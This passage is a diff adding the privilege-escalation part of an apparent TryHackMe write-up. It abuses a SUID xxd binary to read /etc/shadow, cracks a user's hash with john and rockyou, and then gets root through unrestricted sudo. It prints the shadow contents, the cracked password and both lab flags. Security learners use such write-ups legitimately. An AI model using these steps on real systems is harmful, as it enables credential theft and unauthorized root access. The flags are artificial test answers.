@@ -287,6 +287,104 @@ www-data@ubuntu:/$ whoami
 www-data
 ```
 
+Getting the first user flag:
+```sh
+www-data@ubuntu:/$ ls /home/
+vianka
+www-data@ubuntu:/$ ls /home/vianka/
+redis-stable  user.txt
+www-data@ubuntu:/$ cat /home/vianka/user.txt
+thm{red1s_rce_w1thout_credent1als}
+```
+
+After using linpeas for further enumeration I found that we got elevated permissions on a binary:
+```sh
+www-data@ubuntu:/$ ls -la /usr/bin/xxd
+-rwsr-xr-x 1 root root 18552 Mar 18  2020 /usr/bin/xxd
+```
+
+Using GTFOBins I was able to find a simple command to abuse the binary to view `/etc/shadow/`.
+```sh
+www-data@ubuntu:/$ LFILE=/etc/shadow
+www-data@ubuntu:/$ xxd "$LFILE" | xxd -r
+root:!:18507:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18506:0:99999:7:::
+uuidd:*:18506:0:99999:7:::
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+```
+
+Here we found the password hash of the user `vianka`.
+
+Bruteforcing the Hash:
+```sh
+$ echo 'vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::' > hash
+$ john hash --wordlist=../../Desktop/rockyou.txt             
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+beautiful1       (vianka)     
+1g 0:00:00:00 DONE (2023-10-10 10:01) 6.666g/s 10240p/s 10240c/s 10240C/s kucing..mexico1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Logging into the user account:
+```sh
+www-data@ubuntu:/$ su vianka
+Password: beautiful1
+
+vianka@ubuntu:/$ sudo -l
+[sudo] password for vianka: beautiful1
+
+Matching Defaults entries for vianka on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User vianka may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+```
+
+Now that seems to be too easy. The user may run any command with sudo.
+```sh
+vianka@ubuntu:/$ sudo su
+root@ubuntu:/# whoami
+root
+root@ubuntu:/# ls /root/
+root.txt
+root@ubuntu:/# cat /root/*
+thm{xxd_pr1v_escalat1on}
+```
+
+
+
+
+
+
 
 
 
